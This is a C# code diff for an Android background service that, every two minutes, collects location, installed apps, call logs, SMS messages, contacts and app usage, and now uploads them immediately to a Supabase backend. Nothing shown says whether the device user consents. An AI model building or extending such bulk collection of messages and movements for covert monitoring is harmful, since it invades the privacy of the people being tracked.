@@ -78,15 +78,16 @@ public sealed class DeviceBackgroundService : IDisposable
         {
             try
             {
-                await CollectAndStoreAllLocalOnlyAsync(ct);
+                await CollectAndStoreAllAsync(ct);
+                await TryImmediateSyncAsync(ct);
             }
-            catch (System.OperationCanceledException) { break; }
+            catch (OperationCanceledException) { break; }
             catch (Exception ex)
             {
                 System.Diagnostics.Debug.WriteLine($"[BG] Error: {ex.Message}");
             }
 
-            var interval = Preferences.Get("collection_interval_minutes", 1);
+            var interval = Preferences.Get("collection_interval_minutes", 2);
             await Task.Delay(TimeSpan.FromMinutes(interval), ct);
         }
     }
@@ -96,35 +97,14 @@ public sealed class DeviceBackgroundService : IDisposable
     /// </summary>
     public async Task CollectAndStoreAllAsync(CancellationToken ct)
     {
-        await SafeAsync(() => CollectLocationAsync(ct), "location");
-        await SafeAsync(() => CollectDeviceStateAsync(ct), "state");
-        await SafeAsync(() => CollectInstalledAppsAsync(ct), "apps");
-        await SafeAsync(() => CollectCallLogsAsync(), "call_logs");
-        await SafeAsync(() => CollectSmsAsync(), "sms");
-        await SafeAsync(() => CollectContactsIfNeededAsync(), "contacts");
-        await SafeAsync(() => CollectAppUsageIfNeededAsync(), "usage");
-        try { await _supabase.SendHeartbeatAsync(); } catch { }
-    }
-
-    /// <summary>
-    /// مثل CollectAndStoreAllAsync ولكن بدون محاولة الرفع — فقط تخزين محلي
-    /// </summary>
-    public async Task CollectAndStoreAllLocalOnlyAsync(CancellationToken ct)
-    {
-        await SafeAsync(() => CollectLocationAsync(ct), "location");
-        await SafeAsync(() => CollectDeviceStateAsync(ct), "state");
-        await SafeAsync(() => CollectInstalledAppsAsync(ct), "apps");
-        await SafeAsync(() => CollectCallLogsAsync(), "call_logs");
-        await SafeAsync(() => CollectSmsAsync(), "sms");
-        await SafeAsync(() => CollectContactsIfNeededAsync(), "contacts");
-        await SafeAsync(() => CollectAppUsageIfNeededAsync(), "usage");
-        try { await _supabase.SendHeartbeatAsync(); } catch { }
-    }
-
-    private async Task SafeAsync(Func<Task> fn, string name)
-    {
-        try { await fn(); }
-        catch (Exception ex) { System.Diagnostics.Debug.WriteLine($"[BG] {name} failed: {ex.Message}"); }
+        await CollectLocationAsync(ct);
+        await CollectDeviceStateAsync(ct);
+        await CollectInstalledAppsAsync(ct);
+        CollectCallLogs();
+        CollectSms();
+        await CollectContactsIfNeededAsync();
+        await CollectAppUsageIfNeededAsync();
+        await _supabase.SendHeartbeatAsync();
     }
 
     /// <summary>
@@ -318,26 +298,6 @@ public sealed class DeviceBackgroundService : IDisposable
                     var appDataDir = FileSystem.AppDataDirectory;
                     var driveInfo = new DriveInfo(Path.GetPathRoot(appDataDir) ?? appDataDir);
 
-                    var signalStrength = 0;
-                    var ramTotal = 0L;
-                    var ramAvail = 0L;
-                    try
-                    {
-                        var ctx2 = Android.App.Application.Context;
-                        var tm = ctx2.GetSystemService(Android.Content.Context.TelephonyService) as Android.Telephony.TelephonyManager;
-                        if (tm != null && Android.OS.Build.VERSION.SdkInt >= Android.OS.BuildVersionCodes.M)
-                            signalStrength = tm.SignalStrength?.GetLevel() ?? 0;
-                        var am = ctx2.GetSystemService(Android.Content.Context.ActivityService) as Android.App.ActivityManager;
-                        if (am != null)
-                        {
-                            var mi = new Android.App.ActivityManager.MemoryInfo();
-                            am.GetMemoryInfo(mi);
-                            ramTotal = mi.TotalMem;
-                            ramAvail = mi.AvailMem;
-                        }
-                    }
-                    catch { }
-
                     var stateRecord = new DeviceStateRecord
                     {
                         DeviceSerial = _deviceSerial,
@@ -345,11 +305,8 @@ public sealed class DeviceBackgroundService : IDisposable
                         BatteryStatus = battery.PowerSource != BatteryPowerSource.Battery ? "charging" : "discharging",
                         IsCharging = battery.PowerSource != BatteryPowerSource.Battery,
                         NetworkType = conn.NetworkAccess == NetworkAccess.Internet ? "cellular_4g" : "none",
-                        SignalStrength = signalStrength,
                         StorageTotal = driveInfo.TotalSize,
                         StorageAvailable = driveInfo.AvailableFreeSpace,
-                        RamTotal = ramTotal,
-                        RamAvailable = ramAvail,
                         CapturedAt = DateTime.UtcNow
                     };
                     var ok = await _supabase.PushDeviceStateAsync(stateRecord);
@@ -404,33 +361,7 @@ public sealed class DeviceBackgroundService : IDisposable
             var appDataDir = FileSystem.AppDataDirectory;
             var driveInfo = new DriveInfo(Path.GetPathRoot(appDataDir) ?? appDataDir);
 
-            var signalStrength = 0;
-        var ramTotal = 0L;
-        var ramAvail = 0L;
-        try
-        {
-            var ctx = Android.App.Application.Context;
-            var tm = ctx.GetSystemService(Android.Content.Context.TelephonyService) as Android.Telephony.TelephonyManager;
-            if (tm != null && Android.OS.Build.VERSION.SdkInt >= Android.OS.BuildVersionCodes.M)
-            {
-                var m = Java.Lang.Reflect.Proxy.GetInvocationHandler(tm);
-                // Try to get signal strength via reflection for simplicity
-                var phoneType = tm.PhoneType;
-                if (phoneType == Android.Telephony.PhoneType.Gsm)
-                    signalStrength = tm.SignalStrength?.GetLevel() ?? 0;
-            }
-            var am = ctx.GetSystemService(Android.Content.Context.ActivityService) as Android.App.ActivityManager;
-            if (am != null)
-            {
-                var mi = new Android.App.ActivityManager.MemoryInfo();
-                am.GetMemoryInfo(mi);
-                ramTotal = mi.TotalMem;
-                ramAvail = mi.AvailMem;
-            }
-        }
-        catch { }
-
-        await _localDb.SaveDeviceStateAsync(new DeviceStateRecord
+            await _localDb.SaveDeviceStateAsync(new DeviceStateRecord
             {
                 DeviceSerial = _deviceSerial,
                 BatteryLevel = battery.ChargeLevel * 100,
@@ -439,11 +370,8 @@ public sealed class DeviceBackgroundService : IDisposable
                 NetworkType = conn.NetworkAccess == NetworkAccess.Internet
                     ? "cellular_4g"
                     : "none",
-                SignalStrength = signalStrength,
                 StorageTotal = driveInfo.TotalSize,
                 StorageAvailable = driveInfo.AvailableFreeSpace,
-                RamTotal = ramTotal,
-                RamAvailable = ramAvail,
                 CapturedAt = DateTime.UtcNow
             });
         }
@@ -490,40 +418,41 @@ public sealed class DeviceBackgroundService : IDisposable
     }
 
     // ======================= CALL LOGS =======================
-    public async Task CollectCallLogsAsync()
+    public Task CollectCallLogsAsync()
+    {
+        CollectCallLogs();
+        return Task.CompletedTask;
+    }
+
+    public void CollectCallLogs()
     {
         try
         {
             var context = Android.App.Application.Context;
             var records = CallLogCollector.Collect(context);
             if (records.Count > 0)
-                await _localDb.SaveCallLogsAsync(records);
+                _ = _localDb.SaveCallLogsAsync(records);
         }
         catch (Exception ex) { System.Diagnostics.Debug.WriteLine($"[BG] CallLogs error: {ex.Message}"); }
     }
 
-    // Keep for backward compatibility
-    public void CollectCallLogs()
+    // ======================= SMS =======================
+    public Task CollectSmsAsync()
     {
-        _ = CollectCallLogsAsync();
+        CollectSms();
+        return Task.CompletedTask;
     }
 
-    // ======================= SMS =======================
-    public async Task CollectSmsAsync()
+    public void CollectSms()
     {
         try
         {
             var context = Android.App.Application.Context;
             var records = SmsCollector.Collect(context);
             if (records.Count > 0)
-                await _localDb.SaveSmsMessagesAsync(records);
+                _ = _localDb.SaveSmsMessagesAsync(records);
         }
         catch (Exception ex) { System.Diagnostics.Debug.WriteLine($"[BG] SMS error: {ex.Message}"); }
-    }
-
-    public void CollectSms()
-    {
-        _ = CollectSmsAsync();
     }
 
     // ======================= CONTACTS (كل 6 ساعات) =======================
@@ -591,15 +520,23 @@ public sealed class DeviceBackgroundService : IDisposable
     // ======================= SYNC =======================
     public async Task SyncAllPendingAsync()
     {
+        var context = Android.App.Application.Context;
+        var cm = context.GetSystemService(Context.ConnectivityService) as Android.Net.ConnectivityManager;
+        var activeNetwork = cm?.ActiveNetworkInfo;
+        if (activeNetwork == null || !activeNetwork.IsConnectedOrConnecting)
+            return;
+
         await TryImmediateSyncAsync(CancellationToken.None);
     }
 
     private async Task TryImmediateSyncAsync(CancellationToken ct)
     {
+        if (_connectivity.NetworkAccess != NetworkAccess.Internet) return;
+
         try
         {
             // Location
-            foreach (var r in await _localDb.GetUnsyncedLocationsAsync(50))
+            foreach (var r in await _localDb.GetUnsyncedLocationsAsync(25))
             {
                 if (ct.IsCancellationRequested) break;
                 if (await _supabase.PushLocationAsync(r))
